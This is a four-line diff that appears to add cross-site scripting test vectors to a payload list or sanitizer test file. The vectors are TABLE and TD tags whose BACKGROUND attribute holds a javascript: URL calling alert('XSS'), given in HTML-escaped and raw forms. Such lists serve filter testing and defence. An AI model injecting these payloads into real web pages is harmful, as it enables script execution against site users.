@@ -1,0 +1,4 @@
+&lt;TABLE BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
+&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
